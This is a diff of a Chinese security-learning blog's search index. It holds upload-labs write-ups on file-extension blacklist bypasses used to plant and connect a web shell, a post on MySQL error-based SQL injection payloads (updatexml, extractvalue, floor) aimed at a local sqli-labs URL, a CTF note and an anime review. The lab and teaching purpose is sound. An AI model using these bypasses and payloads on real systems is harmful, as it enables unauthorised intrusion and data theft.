+<h2 id="第9题-2"><a href="#第9题-2" class="headerlink" title="第9题"></a>第9题</h2><h3 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map()函数"></a>array_map()函数</h3><p>为数组的每个元素应用回调函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(?<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
+<p>array_map() 返回一个 array，包含将 array 的相应值作为回调的参数顺序调用 callback 后的结果（如果提供了更多数组，还会利用 arrays 传入）。callback 函数形参的数量必须匹配 array_map() 实参中数组的数量。多余的实参数组将会被忽略。如果提供的实参数组的数量不足，将抛出 ArgumentCountError。<br><a href="https://www.php.net/manual/zh/function.array-map.php">array_map</a></p>
+<h2 id="第10题-2"><a href="#第10题-2" class="headerlink" title="第10题"></a>第10题</h2><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>\w  匹配字母、数字、下划线。等价于 [A-Za-z0-9_]<br>正则表达式修饰符 i、g、m、s、U、x、a、D、e 等。<br>i  不区分大小写<br>g  全局匹配<br>m  多行匹配<br>e  配合函数preg_replace()使用，可以把匹配来的字符串当正则表达式执行</p>
+<h2 id="第11题-2"><a href="#第11题-2" class="headerlink" title="第11题"></a>第11题</h2>]]></content>
       <categories>
         <category>代码审计</category>
         <category>期末专题</category>
@@ -4432,6 +4437,67 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>代码审计</tag>
         <tag>期末</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-labs_5-10</title>
+    <url>/2022/11/25/upload-labs_5-10/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><p><strong>黑名单过滤（后缀名特殊字符多写）</strong><br>尝试其它都无法成功，因此选择特殊字符重写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php. .         在php后加一个点，加一个空格，再加一个点，上传成功</span><br></pre></td></tr></table></figure>
+<p>蚁剑按正常后缀连接成功。</p>
+<h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><p><strong>黑名单过滤（大小写绕过）</strong><br>尝试其它都无法成功，因此选择大小写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.Php            任意改变php的大小写，上传成功</span><br></pre></td></tr></table></figure>
+<p>正常情况下，蚁剑按正常后缀连接成功<br>PS: 我的出问题了，文件能上传，但打开文件时会出现HTTP500错误，没有找到原因，只能重装phpstudy解决</p>
+<h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><p><strong>黑名单过滤（空格绕过）</strong><br>尝试其它都无法成功，因此选择空格绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php            在php后加一个空格，上传成功</span><br></pre></td></tr></table></figure>
+<p>蚁剑按正常后缀连接成功</p>
+<h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><p><strong>黑名单过滤（点绕过）</strong><br>尝试其它都无法成功，因此选择点绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php.          在php后加一个点，上传成功</span><br></pre></td></tr></table></figure>
+<p>蚁剑按正常后缀连接成功</p>
+<h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><p><strong>黑名单过滤（流文件绕过）</strong><br>尝试其它都无法成功，因此选择流文件绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php::$DATA    在php后加::$DATA，上传成功</span><br></pre></td></tr></table></figure>
+<p>蚁剑按正常后缀连接成功</p>
+<h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><p>方法和第5关相同，不过多叙述</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>遇事不决，重装解决</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
+]]></content>
+      <categories>
+        <category>upload-labs</category>
+      </categories>
+      <tags>
+        <tag>upload-labs</tag>
+        <tag>蚁剑</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>孤独摇滚--忐忑不安的吉他英雄</title>
+    <url>/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</url>
+    <content><![CDATA[<p><img src="/images/band_2.png" alt="band"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p>
+<h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p>
+<h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p>
+<ul>
+<li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li>
+<li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li>
+<li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li>
+</ul>
+<h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p>
+<h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p>
+<h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p>
+<p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p>
+<p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p>
+<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p>
+<h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>
+]]></content>
+      <categories>
+        <category>动画，孤独摇滚</category>
+      </categories>
+      <tags>
+        <tag>孤独摇滚</tag>
       </tags>
   </entry>
   <entry>
@@ -4548,64 +4614,79 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>孤独摇滚--忐忑不安的吉他英雄</title>
-    <url>/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</url>
-    <content><![CDATA[<p><img src="/images/band_2.png" alt="band"></p>
+    <title>报错注入常用函数</title>
+    <url>/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p>
 <span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p>
-<h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p>
-<h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p>
+
+<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ol>
+<li>格式<br>updatexml(XML_document,XPath_string,new_value)</li>
+</ol>
 <ul>
-<li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li>
-<li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li>
-<li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li>
+<li>XML_document: xml标记</li>
+<li>XPath_string: 显示输入语句</li>
+<li>new_value: 新值</li>
+<li>输出字符长度限制为32个字符</li>
+<li>适用版本：5.1.5以上</li>
 </ul>
-<h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p>
-<h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p>
-<h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p>
-<p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p>
-<p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p>
-<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p>
-<h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>
+<ol start="2">
+<li>原理<br>updatexml()函数是MySQL对XML文档数据进行查询和修改的XPATH函数：</li>
+</ol>
+<ul>
+<li>xml:可扩展语言</li>
+<li>update():函数更新</li>
+<li>组合，具有查询功能的函数，用于查询xpath<br>利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到查询内容的目的</li>
+</ul>
+<ol start="3">
+<li>示例<br>updatexml(1,concat(0x7e,(select database()),0x7e),1)</li>
+</ol>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ol>
+<li><p>格式<br>extractvalue(XML_document,XPath_string):<br>XML_document是string格式，为XML文档对象的名称<br>XPath_string(Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串</p>
+</li>
+<li><p>原理</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a/b&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>该语句是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误，就会报错</p>
+</li>
+</ol>
+<ul>
+<li>输出字符长度限制为32个字符</li>
+<li>适用版本：5.1.5以上</li>
+</ul>
+<ol start="3">
+<li>示例<br>extractvalue(1,concat(0x7e,(select database())))</li>
+</ol>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><ol>
+<li>格式<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(payload,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>payload是需要插入sql注入语句的位置</li>
+<li>floor():去除小数部分</li>
+<li>rand():产生随机数</li>
+<li>rand(x):每个x对应一个固定的值，连续执行多次值会变化，但可预测，序列为011011…</li>
+<li>count():count(*)函数返回表中的记录数</li>
+<li>适用版本：5.0 &lt; MySQL &lt; 8.x</li>
+</ul>
+<ol start="2">
+<li><p>原理<br>利用数据库表主键不能重复的原理，使用group by分组，产生主键key冗余，导致报错<br>详细解释：<a href="https://blog.csdn.net/qq_43504939/article/details/90046342">SQL注入:floor()报错注入</a></p>
+</li>
+<li><p>示例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><p><a href="https://blog.csdn.net/qq_43238111/article/details/106205125">报错注入常用函数</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/GTL-JU/p/16054806.html">报错注入常用的三种注入方式</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/weixin_46706771/article/details/112768348">MYSQL 通过ExtractValue()报错注入</a></p>
+</li>
+</ul>
 ]]></content>
       <categories>
-        <category>动画，孤独摇滚</category>
+        <category>SQL注入</category>
+        <category>报错注入</category>
       </categories>
       <tags>
-        <tag>孤独摇滚</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>upload-labs_5-10</title>
-    <url>/2022/11/25/upload-labs_5-10/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><p><strong>黑名单过滤（后缀名特殊字符多写）</strong><br>尝试其它都无法成功，因此选择特殊字符重写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php. .         在php后加一个点，加一个空格，再加一个点，上传成功</span><br></pre></td></tr></table></figure>
-<p>蚁剑按正常后缀连接成功。</p>
-<h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><p><strong>黑名单过滤（大小写绕过）</strong><br>尝试其它都无法成功，因此选择大小写绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.Php            任意改变php的大小写，上传成功</span><br></pre></td></tr></table></figure>
-<p>正常情况下，蚁剑按正常后缀连接成功<br>PS: 我的出问题了，文件能上传，但打开文件时会出现HTTP500错误，没有找到原因，只能重装phpstudy解决</p>
-<h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><p><strong>黑名单过滤（空格绕过）</strong><br>尝试其它都无法成功，因此选择空格绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php            在php后加一个空格，上传成功</span><br></pre></td></tr></table></figure>
-<p>蚁剑按正常后缀连接成功</p>
-<h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><p><strong>黑名单过滤（点绕过）</strong><br>尝试其它都无法成功，因此选择点绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php.          在php后加一个点，上传成功</span><br></pre></td></tr></table></figure>
-<p>蚁剑按正常后缀连接成功</p>
-<h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><p><strong>黑名单过滤（流文件绕过）</strong><br>尝试其它都无法成功，因此选择流文件绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php::$DATA    在php后加::$DATA，上传成功</span><br></pre></td></tr></table></figure>
-<p>蚁剑按正常后缀连接成功</p>
-<h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><p>方法和第5关相同，不过多叙述</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>遇事不决，重装解决</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
-]]></content>
-      <categories>
-        <category>upload-labs</category>
-      </categories>
-      <tags>
-        <tag>upload-labs</tag>
-        <tag>蚁剑</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -4719,82 +4800,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>报错注入常用函数</title>
-    <url>/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p>
-<span id="more"></span>
-
-<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ol>
-<li>格式<br>updatexml(XML_document,XPath_string,new_value)</li>
-</ol>
-<ul>
-<li>XML_document: xml标记</li>
-<li>XPath_string: 显示输入语句</li>
-<li>new_value: 新值</li>
-<li>输出字符长度限制为32个字符</li>
-<li>适用版本：5.1.5以上</li>
-</ul>
-<ol start="2">
-<li>原理<br>updatexml()函数是MySQL对XML文档数据进行查询和修改的XPATH函数：</li>
-</ol>
-<ul>
-<li>xml:可扩展语言</li>
-<li>update():函数更新</li>
-<li>组合，具有查询功能的函数，用于查询xpath<br>利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到查询内容的目的</li>
-</ul>
-<ol start="3">
-<li>示例<br>updatexml(1,concat(0x7e,(select database()),0x7e),1)</li>
-</ol>
-<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ol>
-<li><p>格式<br>extractvalue(XML_document,XPath_string):<br>XML_document是string格式，为XML文档对象的名称<br>XPath_string(Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串</p>
-</li>
-<li><p>原理</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a/b&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>该语句是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误，就会报错</p>
-</li>
-</ol>
-<ul>
-<li>输出字符长度限制为32个字符</li>
-<li>适用版本：5.1.5以上</li>
-</ul>
-<ol start="3">
-<li>示例<br>extractvalue(1,concat(0x7e,(select database())))</li>
-</ol>
-<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><ol>
-<li>格式<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(payload,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li>payload是需要插入sql注入语句的位置</li>
-<li>floor():去除小数部分</li>
-<li>rand():产生随机数</li>
-<li>rand(x):每个x对应一个固定的值，连续执行多次值会变化，但可预测，序列为011011…</li>
-<li>count():count(*)函数返回表中的记录数</li>
-<li>适用版本：5.0 &lt; MySQL &lt; 8.x</li>
-</ul>
-<ol start="2">
-<li><p>原理<br>利用数据库表主键不能重复的原理，使用group by分组，产生主键key冗余，导致报错<br>详细解释：<a href="https://blog.csdn.net/qq_43504939/article/details/90046342">SQL注入:floor()报错注入</a></p>
-</li>
-<li><p>示例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><p><a href="https://blog.csdn.net/qq_43238111/article/details/106205125">报错注入常用函数</a></p>
-</li>
-<li><p><a href="https://www.cnblogs.com/GTL-JU/p/16054806.html">报错注入常用的三种注入方式</a></p>
-</li>
-<li><p><a href="https://blog.csdn.net/weixin_46706771/article/details/112768348">MYSQL 通过ExtractValue()报错注入</a></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>报错注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>攻防世界-Web_php_unserialize</title>
     <url>/2022/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没注意到细节会吃亏。</p>
@@ -4869,6 +4874,26 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>攻防世界-baby_web</title>
+    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p>
+</li>
+<li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p>
+</li>
